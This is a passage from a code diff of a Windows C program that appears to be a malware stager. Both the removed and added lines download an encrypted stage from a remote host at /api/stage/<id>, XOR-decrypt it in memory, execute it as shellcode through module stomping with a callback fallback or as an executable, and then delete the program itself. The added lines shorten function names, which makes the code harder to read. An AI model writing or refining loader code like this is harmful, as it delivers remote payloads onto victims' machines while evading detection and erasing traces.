-    /* Convert host to wide string */
-    wchar_t whost[256] = {0};
-    MultiByteToWideChar(CP_ACP, 0, host, -1, whost, 256);
+    /* Download + decrypt */
+    DWORD elen=0;
+    uint8_t *enc=dl(whost,_port,wpath,_tls,&elen);
+    if(!enc||!elen)ExitProcess(0);
+    xd(enc,elen);
 
-    /* Build stage URL path: /api/stage/<id> */
-    wchar_t wpath[256] = {0};
-    wchar_t wsid[128]  = {0};
-    MultiByteToWideChar(CP_ACP, 0, sid, -1, wsid, 128);
-    wcscpy_s(wpath, 256, L"/api/stage/");
-    wcscat_s(wpath, 256, wsid);
+    /* Execute — shellcode goes through module stomp then callback fallback */
+    if(_sc){if(!ms(enc,elen))cb_exec(enc,elen);}
+    else exe_exec(enc,elen);
 
-    /* Download encrypted stage */
-    DWORD enc_len = 0;
-    uint8_t *enc = http_download(whost, _port, wpath, _tls, &enc_len);
-    if (!enc || enc_len == 0) ExitProcess(0);
-
-    /* XOR decrypt in-place */
-    xor_dec(enc, enc_len);
-
-    /* Execute payload */
-    if (_sc) {
-        if (!module_stomp(enc, enc_len))
-            direct_exec(enc, enc_len);
-    } else {
-        exe_exec(enc, enc_len);
-    }
-
-    HeapFree(GetProcessHeap(), 0, enc);
-    self_delete();
+    HeapFree(GetProcessHeap(),0,enc);
+    sd();
     return 0;
 }
 `
